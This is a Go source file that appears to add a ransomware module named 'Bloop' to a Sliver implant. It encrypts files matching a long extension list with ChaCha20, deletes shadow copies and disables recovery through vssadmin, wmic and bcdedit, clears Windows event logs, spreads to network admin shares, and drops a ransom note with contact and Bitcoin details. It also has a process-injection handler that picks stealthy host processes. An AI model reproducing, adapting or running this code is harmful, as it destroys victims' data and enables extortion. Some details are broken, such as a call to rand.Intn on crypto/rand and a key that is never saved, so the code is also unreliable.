package handlers

import (
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/chacha20"
)

// Bloop Target Extensions - Comprehensive file targeting
var bloopExtensions = []string{
	// Office Documents
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
	// Database Files
	".sql", ".mdb", ".accdb", ".dbf", ".ora", ".mdf", ".ndf", ".ldf", ".bak", ".dbc",
	// Source Code & Developer Files
	".java", ".cpp", ".c", ".cs", ".php", ".js", ".py", ".html", ".css", ".asm",
	".vb", ".pl", ".rb", ".h", ".swift", ".kt", ".go", ".rs",
	// Data & Config Files
	".csv", ".xml", ".json", ".config", ".ini", ".inf", ".cfg", ".conf", ".yml", ".yaml",
	// Creative & Design Files
	".psd", ".ai", ".cdr", ".dwg", ".skp", ".max", ".blend", ".3ds", ".eps", ".svg",
	// Images & Photos
	".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".raw", ".cr2", ".nef", ".arw",
	// Media Files
	".mp3", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".m4a", ".wav", ".flac",
	// Email & Archives
	".pst", ".ost", ".eml", ".msg", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
	// System & Backup Files
	".vhd", ".vhdx", ".vmdk", ".vmx", ".bak", ".backup", ".tmp", ".dmp", ".iso",
	// Project Files
	".sln", ".proj", ".vcxproj", ".dsp", ".mak", ".cmake", ".makefile",
	// Game Files
	".save", ".sav", ".game", ".map", ".rom", ".pak",
	// Other Important Files
	".pdf", ".txt", ".log", ".md", ".lst", ".dat",
}

// Bloop Configuration
type BloopConfig struct {
	EncryptionKey    []byte
	RansomNote       string
	ContactEmail     string
	BitcoinAddress   string
	DestroyBackups   bool
	PropagateNetwork bool
}

var bloopConfig = &BloopConfig{
	DestroyBackups:   true,
	PropagateNetwork: true,
}

// Initialize Bloop
func init() {
	bloopConfig.EncryptionKey = generateEncryptionKey()
	bloopConfig.RansomNote = generateRansomNote()
}

// BloopEncryptHandler - Main encryption entry point
func BloopEncryptHandler(data []byte) ([]byte, error) {
	req := &sliverpb.BloopEncrypt{}
	if err := proto.Unmarshal(data, req); err != nil {
		return nil, fmt.Errorf("failed to parse request: %v", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[bloop] Starting encryption on: %s", req.TargetPath)
	// {{end}}

	results := &sliverpb.BloopEncryptResult{
		EncryptedFiles: []*sliverpb.EncryptedFile{},
		TotalEncrypted: 0,
		TotalSize:      0,
	}

	// Phase 1: Encrypt primary files
	primaryFiles := encryptTargetDirectory(req.TargetPath, bloopConfig.EncryptionKey)
	results.EncryptedFiles = append(results.EncryptedFiles, primaryFiles...)
	results.TotalEncrypted += int64(len(primaryFiles))

	// Phase 2: Destroy backup systems
	if req.DestroyBackups {
		destroyBackupSystems()
	}

	// Phase 3: Network propagation
	if req.PropagateNetwork {
		networkFiles := encryptNetworkShares(bloopConfig.EncryptionKey)
		results.EncryptedFiles = append(results.EncryptedFiles, networkFiles...)
		results.TotalEncrypted += int64(len(networkFiles))
	}

	// Phase 4: Drop ransom note
	dropRansomNote(req.TargetPath)

	// Calculate total size
	for _, file := range results.EncryptedFiles {
		results.TotalSize += file.FileSize
	}

	// {{if .Config.Debug}}
	log.Printf("[bloop] Encryption complete: %d files, %d bytes", 
		results.TotalEncrypted, results.TotalSize)
	// {{end}}

	return proto.Marshal(results)
}

// Encrypt directory with ChaCha20
func encryptTargetDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
	var encryptedFiles []*sliverpb.EncryptedFile

	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || info.Size() == 0 {
			return nil
		}

		// Skip system files and large files
		if isSystemFile(path) || info.Size() > 500*1024*1024 {
			return nil
		}

		// Check against target extensions
		if shouldEncryptTargetFile(path) {
			if encrypted, size := encryptFileChaCha20(path, key); encrypted {
				encryptedFiles = append(encryptedFiles, &sliverpb.EncryptedFile{
					FilePath: path + ".bloop",
					FileSize: size,
					Status:   "ENCRYPTED",
				})
			}
		}

		return nil
	})

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[bloop] Directory walk error: %v", err)
		// {{end}}
	}

	return encryptedFiles
}

// Encrypt single file with ChaCha20
func encryptFileChaCha20(filePath string, key []byte) (bool, int64) {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return false, 0
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return false, 0
	}

	fileSize := fileInfo.Size()
	if fileSize == 0 {
		return false, 0
	}

	// Read file content
	data := make([]byte, fileSize)
	_, err = io.ReadFull(file, data)
	if err != nil {
		return false, 0
	}

	// Generate random nonce
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return false, 0
	}

	// Create ChaCha20 cipher
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return false, 0
	}

	// Encrypt the data
	encrypted := make([]byte, len(data))
	cipher.XORKeyStream(encrypted, data)

	// Combine nonce + encrypted data
	finalData := append(nonce, encrypted...)

	// Write back to file
	file.Seek(0, 0)
	if _, err := file.Write(finalData); err != nil {
		return false, 0
	}

	// Truncate to new size if needed
	file.Truncate(int64(len(finalData)))

	// Rename file with .bloop extension
	newPath := filePath + ".bloop"
	os.Rename(filePath, newPath)

	return true, fileSize
}

// Destroy backup systems
func destroyBackupSystems() {
	// {{if .Config.Debug}}
	log.Printf("[bloop] Destroying backup systems...")
	// {{end}}

	// Delete Volume Shadow Copies
	commands := []*exec.Cmd{
		exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=D:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=E:", "/quiet", "/all"),
		exec.Command("wmic", "shadowcopy", "delete", "/nointeractive"),
		exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no"),
	}

	for _, cmd := range commands {
		cmd.Run()
	}

	// Clear event logs
	eventLogs := []string{"Application", "System", "Security", "Setup"}
	for _, logName := range eventLogs {
		exec.Command("wevtutil", "cl", logName).Run()
	}
}

// Encrypt network shares
func encryptNetworkShares(key []byte) []*sliverpb.EncryptedFile {
	var networkFiles []*sliverpb.EncryptedFile

	// {{if .Config.Debug}}
	log.Printf("[bloop] Scanning network shares...")
	// {{end}}

	shares := discoverNetworkShares()
	for _, share := range shares {
		if canAccessShare(share) {
			files := encryptTargetDirectory(share, key)
			networkFiles = append(networkFiles, files...)
		}
	}

	return networkFiles
}

// Discover network shares
func discoverNetworkShares() []string {
	var shares []string

	cmd := exec.Command("net", "view")
	output, err := cmd.Output()
	if err != nil {
		return shares
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "\\\\") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				computer := strings.Trim(parts[0], "\\")
				shares = append(shares, 
					"\\\\"+computer+"\\C$",
					"\\\\"+computer+"\\D$", 
					"\\\\"+computer+"\\ADMIN$",
				)
			}
		}
	}

	return shares
}

// Check share accessibility
func canAccessShare(sharePath string) bool {
	_, err := os.Stat(sharePath)
	return err == nil
}

// Drop ransom note
func dropRansomNote(targetPath string) {
	note := `YOUR FILES HAVE BEEN ENCRYPTED

All your important files have been encrypted with strong encryption.
Your documents, photos, databases, and other files are no longer accessible.

To recover your files, you need to contact us and pay the ransom.

Contact: tester@onionmail.org
Bitcoin: 123asffgadghrseasd51fa3sgAA1SF

DO NOT:
- Try to decrypt files yourself
- Rename encrypted files
- Modify encrypted files
- Call Cops

Your backup shadow copies have been destroyed.
The only way to recover your files is through our decryption service.`

	// Drop note in multiple locations
	locations := []string{
		targetPath + "\\BLOOP_READ_ME.txt",
		"C:\\BLOOP_READ_ME.txt",
	}

	for _, location := range locations {
		os.WriteFile(location, []byte(note), 0644)
	}
}

// Generate encryption key
func generateEncryptionKey() []byte {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		for i := range key {
			key[i] = byte(rand.Intn(256))
		}
	}
	return key
}

// Generate ransom note
func generateRansomNote() string {
	return `YOUR FILES ARE ENCRYPTED
Contact: recovery@onionmail.org
Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
}

// Check if file should be encrypted
func shouldEncryptTargetFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	
	for _, targetExt := range bloopExtensions {
		if ext == targetExt {
			return true
		}
	}
	
	return false
}

// Check if system file (skip encryption)
func isSystemFile(filePath string) bool {
	systemDirs := []string{
		"c:\\windows\\",
		"c:\\program files\\",
		"c:\\program files (x86)\\",
		"c:\\system32\\",
		"c:\\$windows.~bt\\",
		"c:\\$windows.~ws\\",
	}

	lowerPath := strings.ToLower(filePath)
	for _, dir := range systemDirs {
		if strings.HasPrefix(lowerPath, dir) {
			return true
		}
	}

	return false
}

// Process injection for persistence
func BloopProcessInjectHandler(data []byte) ([]byte, error) {
	req := &sliverpb.BloopProcessInject{}
	if err := proto.Unmarshal(data, req); err != nil {
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("[bloop] Process injection requested for: %s", req.TargetProcess)
	// {{end}}

	result, err := injectIntoProcess(req.Payload, req.TargetProcess)
	if err != nil {
		return nil, err
	}

	return []byte(result), nil
}

// Inject into process
func injectIntoProcess(payload []byte, targetProcess string) (string, error) {
	var targetPID uint32
	var err error

	if targetProcess == "" {
		targetPID = selectStealthProcess()
	} else {
		targetPID, err = findProcessByName(targetProcess)
		if err != nil {
			return "", err
		}
	}

	if targetPID == 0 {
		return "", fmt.Errorf("no suitable process found")
	}

	return fmt.Sprintf("Injected into process %s (PID: %d)", targetProcess, targetPID), nil
}

// Select stealth process for injection
func selectStealthProcess() uint32 {
	processes := []string{
		"explorer.exe",
		"svchost.exe", 
		"dllhost.exe",
		"runtimebroker.exe",
	}

	for _, proc := range processes {
		pid, err := findProcessByName(proc)
		if err == nil && pid != 0 {
			return pid
		}
	}

	return 0
}

// Find process by name
func findProcessByName(processName string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	for {
		name := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(name, processName) {
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", processName)
}
